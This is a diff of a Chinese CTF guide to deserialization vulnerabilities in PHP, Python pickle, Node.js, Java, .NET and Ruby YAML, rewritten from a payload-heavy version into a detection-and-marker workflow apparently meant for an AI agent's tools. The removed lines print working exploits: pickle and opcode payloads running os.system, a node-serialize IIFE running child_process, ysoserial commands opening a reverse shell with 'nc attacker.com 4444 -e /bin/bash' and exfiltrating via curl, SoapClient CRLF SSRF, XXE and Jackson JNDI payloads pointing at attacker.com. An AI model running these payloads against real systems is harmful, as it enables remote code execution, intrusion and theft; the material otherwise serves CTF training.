@@ -3,322 +3,184 @@ id: "ctf-website/05-deserialization/deserialization"
 title: "Deserialization Vulnerabilities"
 title_en: "Deserialization Vulnerabilities"
 summary: >
-  多语言反序列化漏洞完整指南，涵盖PHP GC绕过与原生类利用（SoapClient SSRF、SimpleXMLElement XXE）、Python pickle Opcode手写绕过find_class、Node.js node-serialize IIFE代码注入、Java ysoserial体系与Hessian/Jackson gadget链、.NET ViewState利用、Ruby YAML反序列化，以及2024-2025年高级技法。
+  反序列化题面的重点是先识别格式、入口、类路径/依赖、可触发魔术方法和回显/回连 oracle，再选择 PHP/Pickle/Node/Java/.NET/YAML/Hessian/Jackson 等 gadget 路线。本篇给出 magic bytes 识别、格式路由矩阵、最小 harmless marker、DNS/HTTP callback、gadget 选择、成功/失败样本和 Evidence 模板。
 summary_en: >
-  Comprehensive multi-language deserialization guide covering PHP GC bypass and native class abuse (SoapClient SSRF, SimpleXMLElement XXE), Python pickle hand-crafted opcode to bypass find_class, Node.js node-serialize IIFE code injection, Java ysoserial ecosystem with Hessian/Jackson gadget chains, .NET ViewState exploitation, Ruby YAML deserialization, and 2024-2025 advanced techniques.
+  Deserialization work starts by identifying format, entry point, classpath/dependencies, magic method triggers, and echo/callback oracles, then routing to PHP/Pickle/Node/Java/.NET/YAML/Hessian/Jackson gadget families. Includes magic-byte detection, format routing, marker payloads, DNS/HTTP callbacks, gadget choices, success/failure samples, and evidence templates.
 board: "ctf-website"
 category: "05-deserialization"
-signals: ["deserialization", "反序列化", "pickle", "PHP unserialize", "Java gadget chain", "ysoserial", "Hessian"]
+signals: ["deserialization", "反序列化", "pickle", "PHP unserialize", "Java gadget chain", "ysoserial", "Hessian", "ViewState", "YAML"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["反序列化", "deserialization", "PHP反序列化", "Java gadget", "pickle RCE", "ysoserial", "node-serialize", "YAML反序列化", ".NET ViewState"]
+keywords: ["反序列化", "deserialization", "PHP反序列化", "Java gadget", "pickle", "ysoserial", "node-serialize", "YAML反序列化", ".NET ViewState"]
 difficulty: "advanced"
-tags: ["deserialization", "web-security", "rce", "ctf", "injection"]
+tags: ["deserialization", "gadget", "ctf", "injection"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/04-ssrf/ssrf", "ctf-website/03-injection/prototype-pollution"]
 ---
 # Deserialization Vulnerabilities
 
-反序列化漏洞是服务器端逻辑漏洞的核心，主要出现在信任了客户端传入的结构化状态数据时。本指南涵盖主流 Web 语言（PHP、Python、Node.js）的高级反序列化利用战术。
+反序列化不是“见到 blob 就上 gadget”。先确认格式、入口、依赖、触发点、回显或回连，再选链。CTF 里最容易失误的是格式识别错误、payload 被 Base64/URL/签名包裹、或者 gadget 触发了但没有可见 oracle。
 
----
+## 输入信号
 
-## 1. PHP 反序列化高阶技术
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| Base64 以 `rO0AB` 开头 | Java 序列化路线 | URLDNS/DNS callback | Base64 只是普通 token |
+| PHP `O:`, `a:`, `s:` | PHP serialize 路线 | `__wakeup/__destruct` 错误或输出变化 | 数据被 JSON 包裹未 unserialize |
+| Python pickle `gAS`, `\x80\x04` | pickle opcode 路线 | 自定义 marker 被执行/回显 | Unpickler 限制全部拒绝 |
+| Node `_$$ND_FUNC$$_` | node-serialize 路线 | 函数字段被还原 | JSON.parse 不执行 |
+| `__VIEWSTATE` | .NET ViewState | MAC/validationKey 线索 | ViewStateUserKey/MAC 阻断 |
+| YAML/XML/Hessian/Jackson 类型字段 | 多态反序列化 | 类型实例化错误/回连 | 类型白名单拒绝 |
 
-### A. GC (Garbage Collector) 垃圾回收提前销毁绕过
-在很多挑战中，反序列化类拥有 `__wakeup()`（用于清理属性、阻断危险调用）和 `__destruct()`（存在漏洞的析构函数）。我们可以在 PHP 调用 `__wakeup()` 前，通过迫使垃圾回收器（GC）提前回收对象来直接触发 `__destruct()`。
-
-*   **键名冲突原理**：
-    PHP 反序列化数组时，如果遇到重复的键名，前一个键值对应的对象会被覆盖。在覆盖的瞬间，前一个对象失去所有引用，导致 GC 立即将其销毁并调用其 `__destruct()`，之后由于反序列化继续进行，若最后抛出异常导致整个反序列化失败，`__wakeup()` 将永远不会被执行。
-*   **Payload 构造**：
-    假设存在漏洞类为 `Exploit`。我们构造一个包含两个元素的数组：
-    ```php
-    // 正常序列化一个数组，包含两个 Exploit 对象，键名相同：
-    // a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:0;i:1;}
-    ```
-    当 PHP 解析到第二个 `i:0` 时，第一个 `Exploit` 对象被覆盖，GC 立即执行其析构函数（执行恶意逻辑）；由于随后反序列化流程遇到异常或执行完抛错，程序异常中止，跳过了对该对象的常规属性审查。
-
-*   **格式损坏原理**：
-    人为破坏反序列化字符串后部的闭合结构，例如：
-    ```php
-    a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:1;s:10:"corrupted...
-    ```
-    解析完第一个对象后，遇到畸形字段抛出异常，反序列化中断，已解析出的第一个对象被释放，触发 `__destruct()`，但未执行 `__wakeup()`。
-
-### B. 无自定义 Gadget 链时的原生类利用
-当目标代码中没有定义可以串联的利用链时，我们需要在 PHP 环境中寻找内置的原生类进行反序列化：
-
-*   **`SoapClient` 触发 SSRF（支持 CRLF 头部注入）**：
-    利用内置的 `SoapClient` 发起任意 HTTP 请求。配合反序列化可控制其 `_user_agent` 写入 `\r\n` 注入自定义 HTTP 头：
-    ```php
-    $target = "http://127.0.0.1:80/shell.php";
-    $b = new SoapClient(null, array('uri' => 'test', 'location' => $target));
-    
-    // 通过反序列化修改其 user_agent 属性，注入 Cookie 或 Post Data
-    $b->_user_agent = "Antigravity\r\nCookie: session=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 14\r\n\r\ncmd=cat+/flag";
-    
-    echo serialize($b);
-    ```
-    当调用反序列化后对象的任意不存在方法（如被 `__call` 魔术方法转接）时，将向内网 `shell.php` 发送携带恶意 POST payload 的 HTTP 请求。
-
-*   **`SimpleXMLElement` 触发 XXE**：
-    若反序列化输入会被转入 XML 节点处理，可以通过反序列化 `SimpleXMLElement` 引入外部实体（XXE），实现内网任意文件读取：
-    ```php
-    $xxe = new SimpleXMLElement("<!DOCTYPE x [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'><!ENTITY % eval SYSTEM 'http://attacker.com/evil.xml'>%eval;]>", LIBXML_NOENT);
-    echo serialize($xxe);
-    ```
-
----
-
-## 2. Python Pickle 序列化漏洞
-
-Python 的 `pickle` 模块不只是解析数据，它其实是一个小型虚拟机（基于 Opcode）。
-
-### A. 基于 `__reduce__` 自动构造
-最标准的 RCE 利用是通过定义 `__reduce__` 魔术方法，使其在 `unpickle` 时自动执行系统命令：
-
-```python
-import pickle
-import os
-
-class Exploit(object):
-    def __reduce__(self):
-        # 返回一个元组：(可执行对象, (传给该对象的参数元组,))
-        return (os.system, ('whoami',))
-
-payload = pickle.dumps(Exploit())
-print(payload)  # 输出二进制序列
-```
-
-### B. 自定义手写 Opcode 绕过限制
-在防守严格的 CTF 中，后端通常会自定义 `Unpickler.find_class`，限制只能 import 特定的安全白名单模块（如拒绝 `os`, `sys`, `subprocess`）。
-我们可以手写 Opcode 来绕过限制，例如利用已经载入白名单的模块或内置函数：
+## 工作流
 
 ```text
-c__builtin__
-getattr
-(c__builtin__
-__import__
-S'os'
-tR(S'system'
-tRS'whoami'
-tR.
-```
-*Opcode 逻辑*：
-1.  载入 `__builtin__.getattr`。
-2.  载入 `__builtin__.__import__` 并调用它加载 `os` 模块。
-3.  通过 `getattr` 提取 `os` 模块的 `system` 方法。
-4.  调用该方法执行 `whoami`。
-
----
-
-## 3. Node.js `node-serialize` 代码注入
-
-Node.js 环境下的 `node-serialize` 库在进行反序列化时，若遇到符合特定前缀的字符串，会动态使用 `eval()` 恢复为 JS 函数：
-
-### A. IIFE (立即调用函数表达式) 注入
-如果反序列化的字符串带有 `_$$ND_FUNC$$_` 标记，且该函数在定义完毕后紧跟一对括号 `()`，反序列化程序会自动执行此函数。
-
-*   **Payload 构造**：
-    ```json
-    {
-      "username": "admin",
-      "run": "_$$ND_FUNC$$_function() { const exec = require('child_process').execSync; return exec('cat /flag').toString(); }()"
-    }
-    ```
-*   **还原时触发**：
-    当服务端执行 `unserialize(payload)` 时，对象恢复过程直接触发立即执行函数，执行系统命令并将回显赋值给对象的 `run` 属性。
-
----
-
----
-
-## 4. Java 反序列化 (ysoserial 体系)
-
-```bash
-# 指纹: Header/Cookie/Body 含 Base64 编码的 'rO0AB' (Java 序列化 magic)
-# 或 'aced0005' (hex)
-
-# ysoserial 常用 gadget 链
-java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64
-java -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/pwned' | base64
-java -jar ysoserial.jar Spring1 'id' | base64
-java -jar ysoserial.jar Groovy1 'nc attacker.com 4444 -e /bin/bash' | base64
-
-# 检测: 先用 DNSLog gadget
-java -jar ysoserial.jar URLDNS 'http://UNIQUE.attacker.com' | base64
-# → DNS 收到请求 = 反序列化触发
+抽取 blob 与编码层
+  → magic bytes / 类型字段识别
+  → 建 marker payload 和 baseline oracle
+  → 指纹语言、依赖、类路径、过滤器
+  → 选择 gadget 或业务类链
+  → 用回显、DNS/HTTP callback、状态差异记录 Evidence
 ```
 
-### Gadget 链选择决策
+## 0. 格式识别脚本
 
 ```python
-# 按目标环境选 Gadget:
-GADGET_MAP = {
-    "CommonsCollections 3.x": ["CommonsCollections1", "CommonsCollections3", "CommonsCollections5"],
-    "CommonsCollections 4.x": ["CommonsCollections2", "CommonsCollections4", "CommonsCollections6"],
-    "CommonsBeanutils": ["CommonsBeanutils1"],
-    "Spring Framework": ["Spring1", "Spring2"],
-    "Groovy": ["Groovy1"],
-    "JDK 7u21": ["Jdk7u21"],
-    "JRE 8u20": ["Jre8u20"],
-    "RMI": ["RMIRegistryExploit"],
-}
+#!/usr/bin/env python3
+import argparse
+import base64
+import binascii
+import json
+import re
+
+MAGIC = [
+    (b"\xac\xed\x00\x05", "java-serialized"),
+    (b"rO0AB", "java-base64"),
+    (b"O:", "php-object"),
+    (b"a:", "php-array"),
+    (b"\x80\x04", "python-pickle4"),
+    (b"\x80\x05", "python-pickle5"),
+    (b"_$$ND_FUNC$$_", "node-serialize"),
+    (b"AAEAAAD", ".net-binaryformatter-base64"),
+    (b"---", "yaml"),
+]
+
+def layers(raw):
+    yield "raw", raw
+    for name, fn in [
+        ("url", lambda x: bytes.fromhex(x.decode().replace("%", ""))),
+        ("base64", lambda x: base64.b64decode(x + b"=" * (-len(x) % 4))),
+        ("hex", lambda x: binascii.unhexlify(re.sub(rb"\s+", b"", x))),
+    ]:
+        try:
+            yield name, fn(raw)
+        except Exception:
+            pass
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("blob")
+    args = ap.parse_args()
+    raw = args.blob.encode()
+    for layer, data in layers(raw):
+        hits = [fmt for magic, fmt in MAGIC if data.startswith(magic) or magic in data[:80]]
+        print(json.dumps({"layer": layer, "len": len(data), "hits": hits, "prefix_hex": data[:24].hex()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
----
+## 1. 路由矩阵
 
-## 5. .NET 反序列化 (ysoserial.net)
+| 格式 | 指纹 | 第一 oracle | 下一步 |
+|---|---|---|---|
+| PHP serialize | `O:<len>:"Class"` | 修改普通属性看输出 | 找 magic method 和类链 |
+| Python pickle | `\x80`, `GLOBAL`, `REDUCE` | marker print/error | opcode/白名单绕过 |
+| Java | `aced0005` / `rO0AB` | URLDNS callback | 依赖/gadget 指纹 |
+| Node serialize | `_$$ND_FUNC$$_` | IIFE marker | require/module 限制 |
+| .NET ViewState | `__VIEWSTATE` | MAC/错误文本 | validationKey/ViewStateUserKey |
+| YAML/Jackson/Hessian | type tag/class name | 类型实例化错误 | 多态 gadget/业务类 |
+
+## 2. Java URLDNS callback
 
 ```bash
-# 指纹: JSON/XML 序列化类型声明、BinaryFormatter magic bytes
-# ViewState 中的 __VIEWSTATE 参数
-
-# ysoserial.net
-ysoserial.exe -g ObjectDataProvider -c "cmd /c whoami" -f Json.Net
-ysoserial.exe -g WindowsIdentity -c "cmd /c whoami" -f SoapFormatter
-
-# TypeConfuseDelegate gadget (通用性最强)
-ysoserial.exe -g TypeConfuseDelegate -c "cmd" -f BinaryFormatter
+# 先用 DNS/HTTP callback 证明 readObject 触发，再换更高价值链
+java -jar ysoserial.jar URLDNS "http://case-id.listener.example" | base64 -w0
 ```
 
----
+Evidence：callback 域名、时间、来源 IP、目标参数、响应错误。没有 callback 时，不要直接升级 gadget，先确认编码层、签名、压缩和入口是否真的走反序列化。
 
-## 6. Ruby YAML 反序列化
-
-```yaml
-# Ruby 2.x/3.x YAML.load (不安全反序列化)
---- !ruby/object:Gem::Installer
-i: x
----
---- !ruby/object:ERB
-safe_level:
-src: |
-  <%= `id` %>
----
---- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
-? |
-  foo
-  (system('whoami'); @executed = true) unless @executed
-  __END__
-: !ruby/struct
-  defaults:
-    :format: json
-```
-
-```bash
-# 通用 Gadget: 利用 ERB 执行命令
-# 把上述 YAML 发送到接受 YAML 的 endpoint
-curl -X POST https://target.com/api/import -H "Content-Type: application/x-yaml" --data-binary @payload.yml
-```
-
----
-
-## 7. 反序列化识别速查
+## 3. PHP / Python / Node marker
 
 ```python
-# 自动识别序列化格式
-MAGIC = {
-    b"\xac\xed\x00\x05":      "Java serialized object",
-    b"rO0AB":                  "Java serialized (Base64)",
-    b"O:":                     "PHP serialized object",
-    b"a:":                     "PHP serialized array",
-    b"\x80\x02}":              "Python pickle proto 0",
-    b"\x80\x03}":              "Python pickle proto 2",
-    b"\x80\x04":               "Python pickle proto 4",
-    b"_$$ND_FUNC$$_":         "Node.js node-serialize",
-    b"AAEAAAD/////":          ".NET BinaryFormatter",
-    b"---\n":                  "YAML",
-    b"\x00\x01\x00\x00\x00":  ".NET ViewState",
-}
+#!/usr/bin/env python3
+import pickle
+import base64
 
-def detect_format(data: bytes) -> str:
-    for magic, fmt in MAGIC.items():
-        if data.startswith(magic):
-            return fmt
-    # 尝试 Base64 解码
-    import base64
-    try:
-        decoded = base64.b64decode(data)
-        for magic, fmt in MAGIC.items():
-            if decoded.startswith(magic):
-                return f"Base64({fmt})"
-    except: pass
-    return "unknown"
+class Marker:
+    def __reduce__(self):
+        return (print, ("PICKLE_MARKER",))
+
+print(base64.b64encode(pickle.dumps(Marker())).decode())
 ```
-
----
-
----
-
-## 8. 攻击链
-
-```
-PHP 反序列化 → GC bypass → __destruct → SoapClient SSRF → 内网 RCE
-PHP 反序列化 → SimpleXMLElement XXE → 文件读取 → config 泄露
-Python pickle → __reduce__ → os.system → RCE → flag
-Python pickle → Opcode 手写 → 绕过 find_class → import os → RCE
-Node.js node-serialize → IIFE → require('child_process') → RCE
-Java 反序列化 → CommonsCollections5 → Runtime.exec → RCE
-Java RMI → JRMPListener → 反弹连接 → RCE
-.NET ViewState → ysoserial.net → ObjectDataProvider → cmd 执行
-Ruby YAML → ERB gadget → `id` → RCE
-YAML 反序列化 → 文件读取 → .env → 数据库密码 → 数据泄露
-```
-
-## 9. Advanced Deserialization (2024-2025)
-
-### Jackson Polymorphic (Java)
 
 ```json
-// Jackson enableDefaultTyping() → 任意类实例化
-["com.zaxxer.hikari.HikariConfig", {"metricRegistry": "ldap://attacker.com/exp"}]
-["org.springframework.context.support.ClassPathXmlApplicationContext", ["http://attacker.com/beans.xml"]]
+{"marker":"_$$ND_FUNC$$_function(){return 'NODE_SERIALIZE_MARKER'}()"}
 ```
 
-### Hessian Dubbo Gadget
-
-```java
-// Hessian 不走 readObject() → 绕过 Java deserialization filter
-// 利用: SpringPartiallyComparableAdvisorHolder → JNDI
-// 或: SwingLazyValue → Runtime.exec
-Map map = new HashMap();
-map.put("lazyValue", new UIDefaults.ProxyLazyValue("javax.script.ScriptEngineManager"));
-// Hessian 反序列化 → createValue() → ScriptEngineManager
+```text
+O:8:"stdClass":1:{s:6:"marker";s:10:"PHP_MARKER";}
 ```
 
-### JSON.Net TypeNameHandling
+这些 marker 用来判断“是否执行/还原/进入错误分支”，不是最终链。成功样本是 marker 回显、错误栈变化、callback 到达或业务状态变化。
 
-```json
-// TypeNameHandling.None 以外的所有模式都危险
-{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
- "MethodName": "Start", "MethodParameters": {"$type": "...", "values": ["cmd", "/c whoami"]}}
+## 4. Gadget 选择矩阵
+
+| 语言 | 证据 | 常见路线 |
+|---|---|---|
+| PHP | class name、Composer lock、magic method | `__destruct`, `__toString`, Phar metadata, SoapClient SSRF |
+| Java | classpath、依赖版本、JDK | URLDNS, CommonsCollections, Spring, Groovy, Hessian/Dubbo |
+| Python | pickle opcode、find_class 限制 | `__reduce__`, opcode 手写, 已加载模块 |
+| Node | node-serialize/serialize-javascript | IIFE, prototype pollution 串联 |
+| .NET | formatter、ViewState、MAC | ysoserial.net format/gadget 匹配 |
+| Ruby/YAML | type tag、Rails/Gem 版本 | YAML object graph, ERB/Gem gadgets |
+
+## 5. 入口变体
+
+| 包裹方式 | 操作 |
+|---|---|
+| Cookie | URL/base64 双层编码，注意 `;` 截断 |
+| JSON field | payload 字符串转义，Content-Type 固定 |
+| multipart upload | filename/content metadata |
+| session store | 修改 session cookie 或服务端 session 文件 |
+| message queue | body + headers 同时带类型 |
+| cache/job import | 上传配置文件后触发 worker |
+
+## 攻击链
+
+```text
+blob 识别
+  → marker oracle
+  → 依赖/类路径指纹
+  → gadget/业务类链
+  → callback、回显、文件、SSRF、flag 差异
 ```
-
-### JDK 17/21 Internal Gadgets
-
-```python
-# JDK 8 的经典 gadget 被移除后，攻击者转向 JDK 内部类:
-# - java.util.PriorityQueue + Proxy (still works)
-# - javax.management.BadAttributeValueExpException
-# - sun.print.UnixPrintServiceLookup (file read via SSRF-like)
-# - java.nio.file (Path objects deserialization)
-```
-
-记录: 原始序列化 hex/base64、识别出的格式、使用的 gadget 链、DNS callback 验证、最终命令执行结果
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 反序列化端点探测 | `http_probe` | HTTP GET 探测反序列化入口点 |
-| 知识检索 | `kb_router` | 按反序列化攻击信号搜索知识库 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| blob | 原始值、编码层、magic bytes、参数位置 |
+| 格式 | 语言/库/formatter、错误文本、依赖证据 |
+| marker | marker payload、回显/callback/状态差异 |
+| gadget | 链名、前置依赖、触发方法、输入输出 |
+| 成功样本 | callback、命令输出、文件读取、SSRF、flag 或业务状态变化 |
+| 失败样本 | magic 不匹配、签名/MAC 拒绝、类不存在、filter 拒绝、无触发点 |
+| 下一跳 | Soap/SSRF 转 04-ssrf；PP 串联转 prototype-pollution；凭据转 database/payment |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 入口探测 | `http_probe` | 固定 blob 参数、编码层和响应 oracle |
+| 知识路由 | `kb_router` | 按 deserialization、pickle、ysoserial、ViewState、Hessian 搜索 |
